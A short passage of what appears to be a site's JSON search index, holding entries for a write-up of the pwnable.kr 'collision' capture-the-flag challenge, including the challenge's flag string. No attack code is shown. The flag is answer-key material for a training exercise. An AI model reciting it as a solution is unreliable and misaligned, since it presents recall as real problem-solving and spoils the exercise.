\u57f7\u884c\u5f8c\u5f97\u5230flag","title":"Write-up"},{"location":"CTF/pwnable.kr/collision/#flag","text":"daddy! I just managed to create a hash collision :)","title":"flag"}]}